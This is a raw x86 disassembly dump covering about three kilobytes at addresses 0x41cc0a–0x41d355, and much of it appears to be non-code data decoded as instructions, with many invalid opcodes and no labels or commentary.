  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	jbe    0x41cc0c
  41cc0e:	aaa    
  41cc0f:	(bad)  
  41cc10:	fist   WORD PTR [eax+0x2846819d]
  41cc16:	sti    
  41cc17:	fdivr  DWORD PTR [ecx]
  41cc19:	pop    edx
  41cc1a:	and    DWORD PTR [ebp+0x1db0953c],eax
  41cc20:	cmp    BYTE PTR [ebx+0x473af4c],bl
  41cc26:	sub    eax,0x2c6bdea5
  41cc2b:	mov    esi,0xc259abc6
  41cc30:	pcmpgtw mm3,QWORD PTR [ecx+0x4d70aa38]
  41cc37:	rcr    BYTE PTR [edx-0x6865177a],0xa7
  41cc3e:	test   al,ch
  41cc40:	es ja  0x41cbcc
  41cc43:	mov    edi,0xea2f9f27
  41cc48:	scas   eax,DWORD PTR es:[edi]
  41cc49:	test   eax,0xd43a41dd
  41cc4e:	lods   al,BYTE PTR ds:[esi]
  41cc4f:	in     al,dx
  41cc50:	or     BYTE PTR [eax-0x4586585b],0x69
  41cc57:	pushf  
  41cc58:	mov    ebp,cs
  41cc5a:	add    DWORD PTR [ebp+ebp*2-0xa],edi
  41cc5e:	jge    0x41ccbb
  41cc60:	pop    esi
  41cc61:	pop    eax
  41cc62:	(bad)  
  41cc63:	daa    
  41cc64:	inc    ecx
  41cc65:	mov    ebx,0xb8831fbf
  41cc6a:	les    esp,FWORD PTR [edi+eiz*2-0x65bda791]
  41cc71:	or     BYTE PTR [ebx+0x77ccc185],0xa4
  41cc78:	add    al,0xbf
  41cc7a:	test   DWORD PTR ss:[ebx+0x5d],esp
  41cc7e:	push   ds
  41cc7f:	aad    0xcd
  41cc81:	add    al,0x39
  41cc83:	xchg   ecx,eax
  41cc84:	or     eax,0xd1863e7
  41cc89:	shr    BYTE PTR [ebx+0x7f19b36f],0x5f
  41cc90:	or     edx,esi
  41cc92:	js     0x41cccb
  41cc94:	cdq    
  41cc95:	std    
  41cc96:	(bad)  
  41cc98:	mov    al,0xc3
  41cc9a:	(bad)  
  41cc9c:	fst    QWORD PTR [edx]
  41cc9e:	cmp    al,0x5c
  41cca0:	pop    ebx
  41cca1:	mov    esp,0x4d64b68f
  41cca6:	push   cs
  41cca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca8:	jg     0x41cd02
  41ccaa:	xchg   BYTE PTR [edi-0x10],dl
  41ccad:	inc    eax
  41ccae:	adc    BYTE PTR [esi+0x20ea8722],dh
  41ccb4:	push   cs
  41ccb5:	or     edx,DWORD PTR [edx-0x61]
  41ccb8:	or     al,0x0
	...
  41ccc2:	add    BYTE PTR [eax],al
  41ccc4:	(bad)  
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	cmp    BYTE PTR [eax+0x26],dh
  41ccd3:	or     dl,BYTE PTR [eax]
  41ccd5:	mov    DWORD PTR [ecx],eax
  41ccd7:	add    BYTE PTR [ebp-0x60000000],ch
  41ccdd:	imul   esp,DWORD PTR [ebx-0x55],0xbb966d2e
  41cce4:	and    BYTE PTR [edx],cl
  41cce6:	lods   eax,DWORD PTR ds:[esi]
  41cce7:	stos   DWORD PTR es:[edi],eax
  41cce8:	pcmpeqw mm2,mm5
  41cceb:	lea    eax,[ecx]
  41cced:	inc    edi
  41ccee:	xor    bl,ah
  41ccf0:	dec    eax
  41ccf1:	mov    bl,0x70
  41ccf3:	dec    ecx
  41ccf4:	dec    edi
  41ccf5:	inc    edx
  41ccf6:	sub    edx,DWORD PTR [ecx-0x3b]
  41ccf9:	xchg   ebx,eax
  41ccfa:	dec    esi
  41ccfb:	mov    dh,0x90
  41ccfd:	jnp    0x41cd69
  41ccff:	mov    dl,0x3d
  41cd01:	jp     0x41cd7c
  41cd03:	fimul  WORD PTR [edi-0x4]
  41cd06:	inc    esi
  41cd07:	inc    ebx
  41cd08:	(bad)  
  41cd09:	leave  
  41cd0a:	retf   0xdf0c
  41cd0d:	mov    esi,0xa42f4df3
  41cd12:	mov    esi,0x4b6a2c49
  41cd17:	stos   BYTE PTR es:[edi],al
  41cd18:	xchg   DWORD PTR ds:0x711f3c07,eax
  41cd1e:	loope  0x41cd14
  41cd20:	jmpw   0x9736
  41cd24:	or     DWORD PTR [edi-0xac7a3fe],eax
  41cd2a:	out    0x5f,al
  41cd2c:	dec    esi
  41cd2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd2e:	mov    eax,ds:0x94275967
  41cd33:	stc    
  41cd34:	sbb    al,0x24
  41cd36:	fsubrp st(7),st
  41cd38:	lahf   
  41cd39:	lds    edx,FWORD PTR [esi]
  41cd3b:	enter  0xd2a2,0xd1
  41cd3f:	std    
  41cd40:	daa    
  41cd41:	in     eax,dx
  41cd42:	pop    es
  41cd43:	aad    0x50
  41cd45:	xor    cl,BYTE PTR [ebp+0x438d92a7]
  41cd4b:	jg     0x41cd4e
  41cd4d:	jmp    0x41cdbe
  41cd4f:	mov    ebp,0x4de9b873
  41cd54:	sbb    ch,bl
  41cd56:	(bad)
  41cd59:	retf   
  41cd5a:	repnz ror edx,1
  41cd5d:	nop
  41cd5e:	push   ecx
  41cd5f:	jmp    0x41cce8
  41cd61:	sbb    edx,DWORD PTR [ebp-0x5023cc3a]
  41cd67:	adc    al,0x14
  41cd69:	mov    bl,0x58
  41cd6b:	jmp    0x58c73467
  41cd70:	push   esi
  41cd71:	in     al,dx
  41cd72:	fsubr  QWORD PTR [ebx+0x3d]
  41cd75:	mov    eax,0x8fa96da
  41cd7a:	test   BYTE PTR [ebp+ebp*4+0x4f],bl
  41cd7e:	xor    ebp,DWORD PTR [esi+ebx*1+0x35]
  41cd82:	fstp   st(5)
  41cd84:	cld    
  41cd85:	mov    eax,0x2d6833
	...
  41cd92:	add    BYTE PTR [eax],al
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xd06a4e09
  41cda1:	add    al,0x43
  41cda3:	add    DWORD PTR [ebp-0x52fffe77],edi
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    dh,cl
  41cdad:	jle    0x41cddf
  41cdaf:	retf   
  41cdb0:	repz hlt 
  41cdb2:	mov    ah,0x56
  41cdb4:	pop    edx
  41cdb5:	push   eax
  41cdb6:	push   ecx
  41cdb7:	pop    ss
  41cdb8:	sub    eax,0xf9ffe1b9
  41cdbd:	inc    ecx
  41cdbe:	mov    ah,BYTE PTR ds:0x57c41871
  41cdc4:	inc    eax
  41cdc5:	das    
  41cdc6:	dec    esp
  41cdc7:	inc    ebx
  41cdc8:	jge    0x41ce45
  41cdca:	or     eax,0x95fbe7a6
  41cdcf:	pop    esp
  41cdd0:	sbb    ecx,DWORD PTR [edx+ecx*8]
  41cdd3:	or     dl,BYTE PTR [edi]
  41cdd5:	pop    ebp
  41cdd6:	lahf   
  41cdd7:	mov    al,0x3d
  41cdd9:	outs   dx,DWORD PTR ds:[esi]
  41cdda:	inc    esp
  41cddb:	out    dx,al
  41cddc:	mov    edx,esi
  41cdde:	adc    DWORD PTR [eax],eax
  41cde0:	gs clc 
  41cde2:	pop    ebp
  41cde3:	xor    al,0x96
  41cde5:	add    BYTE PTR [esi],al
  41cde7:	cmp    cl,BYTE PTR [ebp-0x1]
  41cdea:	shl    BYTE PTR [edx],0xba
  41cded:	inc    ebp
  41cdee:	ret    0xb396
  41cdf1:	ins    DWORD PTR es:[edi],dx
  41cdf2:	or     DWORD PTR [ecx-0x105ad1de],edi
  41cdf8:	std    
  41cdf9:	mov    cl,0xff
  41cdfb:	inc    edx
  41cdfc:	sbb    BYTE PTR [ecx+0x13],bh
  41cdff:	loope  0x41ce14
  41ce01:	jg     0x41ce06
  41ce03:	icebp  
  41ce04:	mov    edx,0xa35e1eaf
  41ce09:	aad    0xf0
  41ce0b:	imul   ebx,DWORD PTR [edx-0x1aa520bf],0xffffffe5
  41ce12:	dec    esp
  41ce13:	cwde   
  41ce14:	mov    BYTE PTR [edx],bh
  41ce16:	add    al,0xb0
  41ce18:	pushf  
  41ce19:	jg     0x41cdcd
  41ce1b:	imul   esi,DWORD PTR [eax],0x12
  41ce1e:	ficom  DWORD PTR [edi+0x3af77fc6]
  41ce24:	xchg   esp,eax
  41ce25:	test   DWORD PTR [edx+0x30],ebx
  41ce28:	leave  
  41ce29:	je     0x41ce7b
  41ce2b:	mov    eax,ds:0xa6787943
  41ce30:	in     eax,0x72
  41ce32:	shl    BYTE PTR [esi],cl
  41ce34:	or     BYTE PTR [edi-0x2382a7cd],al
  41ce3a:	inc    ecx
  41ce3b:	xchg   ebp,eax
  41ce3c:	inc    eax
  41ce3d:	cli    
  41ce3e:	fs aas 
  41ce40:	pop    edi
  41ce41:	pop    ss
  41ce42:	pop    ebx
  41ce43:	pop    edi
  41ce44:	fcomp  DWORD PTR [edi]
  41ce46:	xor    BYTE PTR [edx+eiz*2],ch
  41ce49:	mov    ch,0xb5
  41ce4b:	push   ds
  41ce4c:	loope  0x41ce7c
  41ce4e:	and    BYTE PTR [ecx-0x54],dl
  41ce51:	or     al,0x5c
  41ce53:	(bad)  
  41ce54:	mov    al,ds:0x20df7df7
	...
  41ce61:	add    BYTE PTR [eax],al
  41ce63:	add    BYTE PTR [edx],dl
  41ce65:	mov    edx,0xe6f8c6d8
  41ce6a:	push   ds
  41ce6b:	(bad)  
  41ce6c:	adc    bl,dh
  41ce6e:	cwde   
  41ce6f:	out    dx,al
  41ce70:	gs inc esi
  41ce72:	add    DWORD PTR [ecx-0x26],ebx
  41ce75:	stos   BYTE PTR es:[edi],al
  41ce76:	add    DWORD PTR [eax],eax
  41ce78:	lods   eax,DWORD PTR ds:[esi]
  41ce79:	add    BYTE PTR [eax],al
  41ce7b:	add    ch,al
  41ce7d:	pop    esp
  41ce7e:	stc    
  41ce7f:	sbb    DWORD PTR [ebx-0x16],ecx
  41ce82:	xor    BYTE PTR [edi],dh
  41ce84:	xlat   BYTE PTR ds:[ebx]
  41ce85:	mov    DWORD PTR [esi+0x8fec615],ebx
  41ce8b:	call   0x17f0f13b
  41ce90:	push   edi
  41ce91:	push   ebp
  41ce92:	icebp  
  41ce93:	pusha  
  41ce94:	mov    bl,0x9b
  41ce96:	jecxz  0x41ce53
  41ce98:	int3   
  41ce99:	(bad)  
  41ce9a:	fiadd  DWORD PTR [ebp-0x63]
  41ce9d:	sbb    esi,DWORD PTR cs:[edi-0x47]
  41cea1:	pop    ds
  41cea2:	sbb    DWORD PTR [ecx+0x6152e96f],0x23
  41cea9:	jbe    0x41cebf
  41ceab:	cmp    al,BYTE PTR [edi-0x2730be87]
  41ceb1:	into   
  41ceb2:	jae    0x41ceb0
  41ceb4:	pop    ebx
  41ceb5:	cli    
  41ceb6:	mov    ds:0x37e977ff,al
  41cebb:	pop    eax
  41cebc:	xor    ch,dl
  41cebe:	(bad)  
  41cebf:	mov    dh,0xb1
  41cec1:	jnp    0x41cf12
  41cec3:	jae    0x41cf1e
  41cec5:	(bad)  [edx+ebp*4+0x1]
  41cec9:	push   edi
  41ceca:	jae    0x41cf49
  41cecc:	jmp    0x41cebe
  41cece:	stc    
  41cecf:	jns    0x41ce7d
  41ced1:	aaa    
  41ced2:	jmp    0x41ced1
  41ced4:	mov    dl,0x85
  41ced6:	and    al,0xcc
  41ced8:	cmp    DWORD PTR [eax+0x65ba5887],ebp
  41cede:	rcl    BYTE PTR [ecx],1
  41cee0:	fisttp WORD PTR [edi+0x9]
  41cee3:	in     al,dx
  41cee4:	ret    0xbe09
  41cee7:	or     DWORD PTR [edi],edx
  41cee9:	push   edx
  41ceea:	sbb    BYTE PTR [eax-0x792b847b],bh
  41cef0:	lods   eax,DWORD PTR ds:[esi]
  41cef1:	pop    eax
  41cef2:	jecxz  0x41cf25
  41cef4:	iret   
  41cef5:	mov    dh,0x8e
  41cef7:	push   0xfd3d8383
  41cefc:	sub    eax,0x37202d
  41cf01:	mov    edi,DWORD PTR [ecx+0x69]
  41cf04:	dec    ebp
  41cf05:	(bad)  
  41cf07:	jge    0x41cf2e
  41cf09:	aas    
  41cf0a:	pusha  
  41cf0b:	mov    ecx,esi
  41cf0d:	dec    ebx
  41cf0e:	push   cs
  41cf0f:	pop    ebp
  41cf10:	jp     0x41cebe
  41cf12:	adc    eax,0xd564ae30
  41cf17:	pop    edi
  41cf18:	jnp    0x41cf54
  41cf1a:	sbb    eax,DWORD PTR [ebp+0x7dac84c5]
  41cf20:	aas    
  41cf21:	or     eax,0x95b114c7
  41cf26:	mov    bh,BYTE PTR [edi+0x4c]
	...
  41cf34:	dec    ecx
  41cf35:	inc    esi
  41cf36:	sub    BYTE PTR [eax],dh
  41cf38:	das    
  41cf39:	jle    0x41cf94
  41cf3b:	jg     0x41cf03
  41cf3d:	imul   esi,eax,0xffffffd5
  41cf40:	dec    ebp
  41cf41:	mov    bh,0x30
  41cf43:	sub    eax,0x1ab87
  41cf48:	lods   eax,DWORD PTR ds:[esi]
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    dl,dl
  41cf4d:	lahf   
  41cf4e:	xor    ebp,DWORD PTR [esp+edi*8-0x80]
  41cf52:	sbb    ah,bh
  41cf54:	mov    al,ds:0x42fb5364
  41cf59:	pop    ss
  41cf5a:	sub    DWORD PTR [ebx+0x3b3ad4d],0xffffffa2
  41cf61:	mov    bl,0x69
  41cf63:	sub    BYTE PTR [edi],dl
  41cf65:	and    edi,ecx
  41cf67:	mov    edi,0x6a3539cf
  41cf6c:	mov    cl,0x6f
  41cf6e:	scas   eax,DWORD PTR es:[edi]
  41cf6f:	jmp    0x41cfd2
  41cf71:	jo     0x41cfc2
  41cf73:	mov    esi,0x47fd3e8d
  41cf78:	je     0x41cfb3
  41cf7a:	mov    ch,0xfd
  41cf7c:	jno    0x41cf52
  41cf7e:	shl    BYTE PTR [edi-0x2a],cl
  41cf81:	mov    dh,BYTE PTR [esi+eiz*2+0x35afb44e]
  41cf88:	call   0xc8d5a184
  41cf8d:	sub    bl,BYTE PTR [ecx+edx*8-0x56]
  41cf91:	shl    BYTE PTR [esi+0xc10854b],cl
  41cf97:	mov    ebx,0x7994774f
  41cf9c:	fldenv [edx+0x0]
  41cf9f:	loop   0x41cf2b
  41cfa1:	ss inc ebp
  41cfa3:	and    edx,eax
  41cfa5:	or     DWORD PTR [eax+0x7c],esp
  41cfa8:	jmp    0x41cf39
  41cfaa:	leave  
  41cfab:	(bad)  
  41cfac:	push   esi
  41cfad:	pusha  
  41cfae:	sbb    cl,BYTE PTR [edx+0x6f2aaef2]
  41cfb4:	arpl   WORD PTR [ebx],di
  41cfb6:	inc    edx
  41cfb7:	cmp    dh,0x59
  41cfba:	dec    edi
  41cfbb:	dec    ecx
  41cfbc:	push   esi
  41cfbd:	dec    ecx
  41cfbe:	pop    ss
  41cfbf:	adc    dh,BYTE PTR [edi-0x69]
  41cfc2:	push   esi
  41cfc3:	in     eax,dx
  41cfc4:	fld    QWORD PTR [ebp-0x1c]
  41cfc7:	push   esp
  41cfc8:	mov    al,ds:0xdbf2beb8
  41cfcd:	sar    DWORD PTR [edi-0x58],0x8f
  41cfd1:	mov    ds:0x1a8cc733,al
  41cfd6:	push   edi
  41cfd7:	inc    ebx
  41cfd8:	sbb    al,0xa6
  41cfda:	mov    ebx,0x73a03d77
  41cfdf:	dec    edx
  41cfe0:	dec    ebx
  41cfe1:	in     eax,dx
  41cfe2:	xchg   edi,eax
  41cfe3:	cmp    eax,0x1c149ca1
  41cfe8:	sub    BYTE PTR [ecx-0x21a0c2ac],dh
  41cfee:	loope  0x41d022
  41cff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff1:	xor    ecx,esi
  41cff3:	(bad)  
  41cff4:	fucompp 
  41cff6:	dec    cx
  41cff8:	pop    ds
	...
  41d001:	add    BYTE PTR [eax],al
  41d003:	add    BYTE PTR [edi-0x3a],ah
  41d006:	and    dh,dh
  41d008:	mov    eax,ds:0xe7d7f7f6
  41d00d:	mov    eax,0xb398da72
  41d012:	sub    eax,0x1ac341b
  41d017:	add    BYTE PTR [ebp-0x13000000],ch
  41d01d:	and    BYTE PTR [ecx+0xe02dcd4],cl
  41d023:	xchg   ebx,eax
  41d024:	jl     0x41d054
  41d026:	lock or ch,BYTE PTR [eax+ebp*2-0x68ba6a03]
  41d02e:	dec    ebx
  41d02f:	rol    eax,cl
  41d031:	hlt    
  41d032:	(bad)  
  41d033:	outs   dx,DWORD PTR ds:[esi]
  41d034:	push   ebp
  41d035:	push   edx
  41d036:	inc    edx
  41d037:	inc    ecx
  41d038:	cdq    
  41d039:	(bad)  
  41d03a:	push   esp
  41d03b:	jbe    0x41d0ab
  41d03d:	fisub  WORD PTR [esi]
  41d03f:	stos   DWORD PTR es:[edi],eax
  41d040:	sub    ecx,DWORD PTR [ebx]
  41d042:	shl    BYTE PTR [esi-0x52300774],cl
  41d048:	pop    ebx
  41d049:	mov    esp,0x4d02853e
  41d04e:	lods   al,BYTE PTR ds:[esi]
  41d04f:	mov    al,0xe6
  41d051:	push   es
  41d052:	in     al,dx
  41d053:	jae    0x41d017
  41d055:	ret    
  41d056:	out    0x5a,al
  41d058:	pop    ebp
  41d059:	mov    ah,0xe9
  41d05b:	js     0x41d002
  41d05d:	cmp    DWORD PTR [edx],esi
  41d05f:	jmp    0x9450dfcd
  41d064:	cwde   
  41d065:	push   0x6a
  41d067:	stos   DWORD PTR es:[edi],eax
  41d068:	and    BYTE PTR [esi-0x6],0xb4
  41d06c:	add    dl,bl
  41d06e:	shufps xmm3,XMMWORD PTR [eax+0x22],0x3d
  41d073:	ss ret 
  41d075:	mov    bh,0x57
  41d077:	rol    ah,cl
  41d079:	mov    ecx,0x8c36ef9b
  41d07e:	add    al,0x50
  41d080:	adc    eax,0x397aef7a
  41d085:	ror    eax,1
  41d087:	xchg   DWORD PTR [ebx],ecx
  41d089:	xor    cl,ah
  41d08b:	jb     0x41d080
  41d08d:	cli    
  41d08e:	or     ecx,DWORD PTR [esi-0x7ad1b12b]
  41d094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d095:	aaa    
  41d096:	in     eax,dx
  41d097:	out    dx,al
  41d098:	clc    
  41d099:	shl    DWORD PTR [ebx-0x24],1
  41d09c:	sub    al,ah
  41d09e:	xchg   edx,eax
  41d09f:	adc    BYTE PTR [esi-0x71],bl
  41d0a2:	push   cs
  41d0a3:	inc    edi
  41d0a4:	ds (bad) 
  41d0a6:	xlat   BYTE PTR ds:[ebx]
  41d0a7:	aam    0x38
  41d0a9:	repnz cwde 
  41d0ab:	pop    es
  41d0ac:	stos   BYTE PTR es:[edi],al
  41d0ad:	and    BYTE PTR [edi-0x7b9276b7],0x93
  41d0b4:	cmp    esi,ebx
  41d0b6:	shr    DWORD PTR [esi+0x90e361d],1
  41d0bc:	adc    bl,BYTE PTR [eax]
  41d0be:	scas   al,BYTE PTR es:[edi]
  41d0bf:	sahf   
  41d0c0:	and    edx,DWORD PTR [edi+0x3b1be51e]
  41d0c6:	mov    bl,0x95
  41d0c8:	mov    ah,0x0
	...
  41d0d2:	add    BYTE PTR [eax],al
  41d0d4:	ret    
  41d0d5:	or     eax,0xefee66a6
  41d0da:	ret    
  41d0db:	lods   eax,DWORD PTR ds:[esi]
  41d0dc:	sub    al,0xb8
  41d0de:	mov    ds:0x525fb347,eax
  41d0e3:	push   ss
  41d0e4:	loope  0x41d092
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	lods   eax,DWORD PTR ds:[esi]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [eax+ecx*8+0x2fdcf560],bh
  41d0f2:	mov    eax,ds:0xf4f7e706
  41d0f7:	lods   al,BYTE PTR ds:[esi]
  41d0f8:	fidivr WORD PTR [ecx]
  41d0fa:	push   ss
  41d0fb:	mov    ebp,0xcc992422
  41d100:	lods   eax,DWORD PTR ds:[esi]
  41d101:	dec    esp
  41d102:	daa    
  41d103:	sar    BYTE PTR [edx+0x462e04df],cl
  41d109:	jne    0x41d162
  41d10b:	and    DWORD PTR [eax+0x69],ecx
  41d10e:	cmp    BYTE PTR [ecx],0xea
  41d111:	mov    ch,0xb0
  41d113:	in     al,dx
  41d114:	pop    eax
  41d115:	outs   dx,BYTE PTR ds:[esi]
  41d116:	pop    ebx
  41d117:	push   ebp
  41d118:	retf   
  41d119:	xchg   ebx,eax
  41d11a:	jo     0x41d130
  41d11c:	mov    ch,0x6a
  41d11e:	sar    BYTE PTR [eax+0x6d],cl
  41d121:	int3   
  41d122:	leave  
  41d123:	cs jle 0x41d0e5
  41d126:	xchg   ebx,eax
  41d127:	lahf   
  41d128:	cdq    
  41d129:	fild   WORD PTR [edx]
  41d12b:	sub    DWORD PTR [ebp+0x3b],0x385f44eb
  41d132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d133:	inc    ebx
  41d134:	lds    ecx,FWORD PTR [edx]
  41d136:	push   ds
  41d137:	xor    al,0xaf
  41d139:	xchg   cl,dl
  41d13b:	pop    edi
  41d13c:	imul   esp,DWORD PTR ds:0x8dede13c,0xab91be80
  41d146:	jl     0x41d1c2
  41d148:	mov    BYTE PTR [ebp-0x72],ah
  41d14b:	arpl   WORD PTR [ebx+eax*2],ax
  41d14e:	call   0x779e50ab
  41d153:	sub    dh,BYTE PTR [ebx+0x4]
  41d156:	retf   0x1222
  41d159:	arpl   WORD PTR [esp+0x71ce1043],bp
  41d160:	jg     0x41d1c5
  41d162:	xor    DWORD PTR [edi+edi*1-0x5eb770c5],ebp
  41d169:	ja     0x41d1dc
  41d16b:	mov    ch,0x92
  41d16d:	retf   
  41d16e:	and    al,0xc3
  41d170:	xchg   ebx,eax
  41d171:	xchg   ecx,ecx
  41d173:	sbb    DWORD PTR [edx],eax
  41d175:	ret    
  41d176:	inc    esp
  41d177:	sub    BYTE PTR [ebp+0x81d5ef4],ch
  41d17d:	cmp    eax,esp
  41d17f:	aad    0x62
  41d181:	sar    eax,1
  41d183:	popf   
  41d184:	shl    DWORD PTR [eax+eiz*1+0x691fbdb],0xd0
  41d18c:	mov    dl,0x1
  41d18e:	imul   edi,DWORD PTR [edx],0x63
  41d191:	std    
  41d192:	inc    esi
  41d193:	ja     0x41d1d0
  41d195:	sbb    ebx,ebx
  41d197:	jg     0x41d218
	...
  41d1a1:	add    BYTE PTR [eax],al
  41d1a3:	add    cl,bl
  41d1a5:	ret    0x4905
  41d1a8:	pop    ds
  41d1a9:	iret   
  41d1aa:	fst    st(2)
  41d1ac:	enter  0xf86f,0xd2
  41d1b0:	scas   eax,DWORD PTR es:[edi]
  41d1b1:	rol    BYTE PTR [eax],0x56
  41d1b4:	mov    gs,WORD PTR [ebp+0x9a0001]
  41d1ba:	add    BYTE PTR [eax],al
  41d1bc:	and    eax,0x98c7713d
  41d1c1:	fs xor eax,0x7ed48acc
  41d1c7:	mov    eax,0x2fb0f39
  41d1cc:	iret   
  41d1cd:	inc    eax
  41d1ce:	loop   0x41d194
  41d1d0:	add    al,0xce
  41d1d2:	inc    ebp
  41d1d3:	adc    dh,BYTE PTR [esi+0x54]
  41d1d6:	adc    edx,DWORD PTR [edi+0x46]
  41d1d9:	and    BYTE PTR [edi+0x6a],ah
  41d1dc:	jo     0x41d189
  41d1de:	(bad)  
  41d1df:	int    0x96
  41d1e1:	lds    esi,FWORD PTR [ebx]
  41d1e3:	out    0xc7,eax
  41d1e5:	ds sub eax,0xcc873b99
  41d1eb:	add    bh,dh
  41d1ed:	out    0xf,eax
  41d1ef:	inc    esi
  41d1f0:	mov    bl,0x9d
  41d1f2:	xchg   ebx,eax
  41d1f3:	sbb    DWORD PTR [ebx+eiz*8+0x410502be],esi
  41d1fa:	mov    ch,0x95
  41d1fc:	std    
  41d1fd:	leave  
  41d1fe:	or     al,BYTE PTR [ecx+0x2ba9fc8e]
  41d204:	inc    edi
  41d205:	imul   eax,DWORD PTR [eax+0x8],0x7bebfd9d
  41d20c:	int3   
  41d20d:	enter  0xf290,0xe0
  41d211:	div    DWORD PTR gs:[ebx+esi*1]
  41d215:	or     eax,0x4f8ee47f
  41d21a:	push   es
  41d21b:	inc    eax
  41d21c:	fnstenv [eax+eax*8-0x78]
  41d220:	repz push 0xa9228f5b
  41d226:	retf   
  41d227:	ret    
  41d228:	dec    esi
  41d229:	stc    
  41d22a:	in     eax,dx
  41d22b:	jp     0x41d1f4
  41d22d:	push   eax
  41d22e:	imul   ebp,DWORD PTR [edi-0x1808b35],0x663d0eee
  41d238:	bound  ebp,QWORD PTR [ebx-0x5166b9fe]
  41d23e:	imul   edx,DWORD PTR [edi+0x6eb911d],0xffffff97
  41d245:	faddp  st(2),st
  41d247:	jb     0x41d2aa
  41d249:	in     eax,dx
  41d24a:	ror    BYTE PTR [edx],cl
  41d24c:	xchg   DWORD PTR [ebp-0x3d077425],eax
  41d252:	and    al,0xb2
  41d254:	inc    edx
  41d255:	or     BYTE PTR [eax],al
	...
  41d263:	add    BYTE PTR [eax],al
  41d265:	pusha  
  41d266:	inc    edx
  41d267:	add    BYTE PTR [eax+eiz*2],al
  41d26a:	inc    edx
  41d26b:	add    BYTE PTR [eax],cl
  41d26d:	pusha  
  41d26e:	inc    edx
  41d26f:	add    BYTE PTR [eax+eiz*2],cl
  41d272:	inc    edx
  41d273:	add    BYTE PTR [eax],dl
  41d275:	pusha  
  41d276:	inc    edx
  41d277:	add    BYTE PTR [eax+eiz*2],dl
  41d27a:	inc    edx
  41d27b:	add    BYTE PTR [eax],bl
  41d27d:	pusha  
  41d27e:	inc    edx
  41d27f:	add    BYTE PTR [eax+eiz*2],bl
  41d282:	inc    edx
  41d283:	add    BYTE PTR [eax],al
  41d285:	jo     0x41d2c9
  41d287:	add    BYTE PTR [eax+esi*2],al
  41d28a:	inc    edx
  41d28b:	add    BYTE PTR [eax],cl
  41d28d:	jo     0x41d2d1
  41d28f:	add    BYTE PTR [eax+esi*2],cl
  41d292:	inc    edx
  41d293:	add    BYTE PTR [eax],dl
  41d295:	jo     0x41d2d9
  41d297:	add    BYTE PTR [eax+esi*2],dl
  41d29a:	inc    edx
  41d29b:	add    BYTE PTR [eax],bl
  41d29d:	jo     0x41d2e1
  41d29f:	add    BYTE PTR [eax+esi*2],bl
  41d2a2:	inc    edx
  41d2a3:	add    BYTE PTR [eax],al
  41d2a5:	add    BYTE PTR [edx+0x0],0x4
  41d2a9:	add    BYTE PTR [edx+0x0],0x8
  41d2ad:	add    BYTE PTR [edx+0x0],0xc
  41d2b1:	add    BYTE PTR [edx+0x0],0x10
  41d2b5:	add    BYTE PTR [edx+0x0],0x14
  41d2b9:	add    BYTE PTR [edx+0x0],0x18
  41d2bd:	add    BYTE PTR [edx+0x0],0x1c
  41d2c1:	add    BYTE PTR [edx+0x0],0x78
  41d2c5:	data16 ins BYTE PTR es:[edi],dx
  41d2c7:	jp     0x41d320
  41d2c9:	jbe    0x41d312
  41d2cb:	ja     0x41d310
  41d2cd:	js     0x41d317
  41d2cf:	jno    0x41d321
  41d2d1:	arpl   WORD PTR [ebx+0x6f],dx
  41d2d4:	inc    edi
  41d2d5:	dec    esi
  41d2d6:	outs   dx,DWORD PTR ds:[esi]
  41d2d7:	pop    ecx
  41d2d8:	inc    edi
  41d2d9:	jb     0x41d322
  41d2db:	jns    0x41d353
  41d2dd:	inc    ecx
  41d2de:	pop    eax
  41d2df:	dec    esp
  41d2e0:	add    BYTE PTR [eax],al
  41d2e2:	add    BYTE PTR [eax],al
  41d2e4:	ins    BYTE PTR es:[edi],dx
  41d2e5:	(bad)  
  41d2e6:	inc    ecx
  41d2e7:	add    BYTE PTR [esi+edx*8+0x41],dh
  41d2eb:	add    BYTE PTR [edx*8+0xbef0041],ch
  41d2f2:	mov    dl,0xe
  41d2f4:	jns    0x41d344
  41d2f6:	xor    BYTE PTR [esi-0x79],cl
  41d2f9:	dec    edi
  41d2fa:	cmp    eax,0x3e4faf4e
  41d2ff:	dec    esi
  41d300:	js     0x41d350
  41d302:	cmp    ecx,DWORD PTR [esi-0x64]
  41d305:	dec    edi
  41d306:	inc    esp
  41d307:	dec    esi
  41d308:	jae    0x41d358
  41d30a:	inc    ecx
  41d30b:	dec    esi
  41d30c:	xor    BYTE PTR [esi+0x40],cl
  41d30f:	dec    esi
  41d310:	pop    esp
  41d311:	pop    ebp
  41d312:	pop    edi
  41d313:	push   edx
  41d314:	cmp    DWORD PTR [esi+0x79],ecx
  41d317:	dec    esi
  41d318:	xor    BYTE PTR [esi-0x79],cl
  41d31b:	dec    edi
  41d31c:	cmp    eax,0x3e4faf4e
  41d321:	dec    esi
  41d322:	js     0x41d372
  41d324:	cmp    ecx,DWORD PTR [esi-0x64]
  41d327:	dec    edi
  41d328:	inc    esp
  41d329:	dec    esi
  41d32a:	mov    DWORD PTR [edi+0x41],ecx
  41d32d:	dec    esi
  41d32e:	xor    BYTE PTR [esi+0x40],cl
  41d331:	dec    esi
  41d332:	pop    esp
  41d333:	ins    DWORD PTR es:[edi],dx
  41d334:	pop    edi
  41d335:	bound  edi,QWORD PTR [ecx]
  41d337:	dec    esi
  41d338:	jns    0x41d388
  41d33a:	xor    BYTE PTR [esi-0x80],cl
  41d33d:	dec    edi
  41d33e:	cmp    eax,0x394e734e
  41d343:	dec    esi
  41d344:	mov    ds:0x304e3a4f,al
  41d349:	dec    esi
  41d34a:	inc    esi
  41d34b:	dec    esi
  41d34c:	pop    esp
  41d34d:	jge    0x41d3ae
  41d34f:	jb     0x41d3c0
  41d351:	sub    BYTE PTR [esi-0x7d],0x7e
  41d355:	xchg   ebx,eax
